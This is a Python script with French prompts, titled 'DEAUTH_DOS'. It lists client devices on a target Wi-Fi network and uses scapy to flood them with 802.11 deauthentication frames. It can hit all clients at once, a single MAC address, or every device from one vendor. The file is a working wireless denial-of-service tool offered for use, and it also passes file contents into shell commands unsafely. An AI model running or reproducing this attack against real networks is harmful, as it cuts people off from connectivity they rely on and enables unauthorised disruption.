from scapy.all import *
import subprocess
from tabulate import tabulate
import time
from art import *
from tqdm import tqdm

tprint("DEAUTH_DOS")

bssid = input("Entrer le bssid du reseau cible :")
channel = int(input("Channel :"))

print("Analyse du réseau :")

for _ in tqdm(range(200), desc="Traitement en cours"):
	time.sleep(0.1)

#commande = f"airodump-ng --bssid {bssid} -c 1 -w output/client wlan0mon"
#process = subprocess.Popen(commande, shell=True)
#time.sleep(15)
#process.terminate()

#commande = "awk -F ',' {'print $1'} output/client-01.csv | sed '1,5d' > client.txt"
#subprocess.run(commande, shell=True)

#commande = "chmod 700 client.txt"
#subprocess.run(commande, shell=True)

print("Machines associées au reseau :")

wireless = {}
tab_marque = []
fichier = "client.txt"
cpt=0
with open(fichier, 'r') as fichier:
	for ligne in fichier:
		if ligne.strip():
			cpt = cpt + 1
			ligne = ligne.strip()
			commande = f"oui {ligne} | head -n 1"
			marque = subprocess.check_output(commande,shell=True,text=True)
			wireless[cpt] = {"MAC": ligne, "Marque": marque.strip()}
			if marque not in tab_marque :
				tab_marque.append(marque.strip())

tableau = [[cpt, valeur["MAC"], valeur["Marque"]] for cpt, valeur in wireless.items()]
headers = ["ID", "MAC address", "Marque"]
tableau_formate = tabulate(tableau, headers=headers, tablefmt="grid")

print(tableau_formate)

target = input("Cible à attaquer : Tous = a / Par mac adresse = s / Par marque = m :")

if (target=="a"):
	client_mac="ff:ff:ff:ff:ff:ff"
	
	conf.iface = "wlan0mon"
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	dp = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()

	for _ in range(num_deauths):
		sendp(dp, iface="wlan0mon", verbose=False)
		print(f"Paquet envoyé à {client_mac}")
elif (target=="s"):
	identifiant = int(input("Entrer l'ID de la cible :"))
	client_mac =  wireless.get(identifiant, {}).get('MAC', None)
	
	conf.iface = "wlan0mon"
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	dp = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()

	for _ in range(num_deauths):
		sendp(dp, iface="wlan0mon", verbose=False)
		print(f"Paquet envoyé à {client_mac}")
elif (target=="m"):
	cptm = 1
	for m in tab_marque :
		print(f"Pour attaquer les machines {m} -> taper {cptm} ")
		cptm = cptm + 1
	choix_marque = int(input("Choix : "))
	mac_marque = []
	for key, values in wireless.items():
		if values['Marque'] == tab_marque[(choix_marque-1)]:
			mac_marque.append(values['MAC'])
	
	conf.iface = "wlan0mon"
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	for _ in range(num_deauths):
		for mac in mac_marque:
			dp = RadioTap() / Dot11(addr1=mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
			sendp(dp, iface="wlan0mon", verbose=False)
			print(f"Paquet envoyé à {mac}")
	
else:
	print("Erreur cible")
	exit(1)

